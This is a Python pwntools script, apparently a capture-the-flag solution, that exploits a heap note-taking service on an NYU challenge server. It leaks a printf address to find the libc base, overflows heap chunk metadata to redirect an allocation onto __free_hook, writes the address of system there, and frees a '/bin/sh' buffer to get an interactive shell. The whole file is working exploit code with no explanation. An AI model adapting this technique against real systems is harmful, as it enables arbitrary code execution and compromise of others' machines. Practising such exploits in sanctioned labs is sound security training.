from pwn import *

conn = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1213)
conn.recvuntil(b"abc123): ")
conn.sendline(b"vc2499")
conn.recvuntil(b".")

def create(data):
    conn.sendlineafter(b"> ", b"1")
    conn.sendafter(b"> ", data)

def update(index, data):
    conn.sendlineafter(b"> ", b"3")
    conn.sendlineafter(b"> ", str(index).encode())
    conn.sendafter(b"> ", data)

libc = ELF('libc.so.6')
printf_offset = libc.symbols['printf']
system_offset = libc.symbols['system']
free_hook_offset = libc.symbols['__free_hook']
bin_sh_offset = next(libc.search(b"/bin/sh"))

conn.recvuntil(b"message: ")
printf_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"Leaked printf address: {hex(printf_leak)}")

libc_base = printf_leak - printf_offset
log.success(f"Libc base address: {hex(libc_base)}")

for _ in range(5):
    create(b"vc2499")

conn.sendlineafter(b"> ", b"4")
conn.sendlineafter(b"> ", b"4")
conn.sendlineafter(b"> ", b"4")
conn.sendlineafter(b"> ", b"3")

update(2, 
    b"A" * 0x40 +
    b"\x50" +
    b"\x00" * 0x7 +
    p64(libc_base + free_hook_offset - 0x8)
)

create(b"vc2499")
create(p64(libc_base + system_offset))

update(1, 
    b"A" * 0x40 +
    b"\x50" +
    b"\x00" * 0x7 +
    b"/bin/sh\0"
)

conn.sendlineafter(b"> ", b"4")
conn.sendlineafter(b"> ", b"2")
conn.interactive()
